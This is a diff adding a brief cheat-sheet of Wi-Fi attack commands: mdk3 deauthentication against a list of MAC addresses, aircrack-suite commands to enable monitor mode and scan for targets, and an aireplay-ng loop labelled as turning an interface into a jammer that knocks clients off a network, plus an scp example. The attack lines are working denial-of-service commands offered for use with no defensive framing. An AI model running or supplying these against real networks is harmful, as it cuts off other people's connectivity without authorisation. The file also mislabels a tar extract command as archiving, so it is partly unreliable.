@@ -1,0 +1,24 @@
+
+
+### Use to Block a List of Devices in a Wifi Using MDK3 ATTACK
+#nano ~/black.txt @@ add mac address to block
+mdk3 wlan0mon d -c 6 -b ~/black.txt
+### Send files using scp protol in ssh shell
+scp File_host_path username@ip:destinationn_path
+## tar the files
+tar -xvf file.tar
+
+### Network Interface
+
+#Turn monitor mode on
+airmon-ng start wlan0
+#Turn Monitor mode Off
+airmon-ng stop wlan0mon
+#@# Scanning For Targets
+airodump-ng wlan0mon
+
+## Convert a Interface to Jammer
+
+# Block a Wifi by dissociation
+aireplay-ng -0 0 -a xx:xx:xx:xx:xx:xx wlan0mon
+
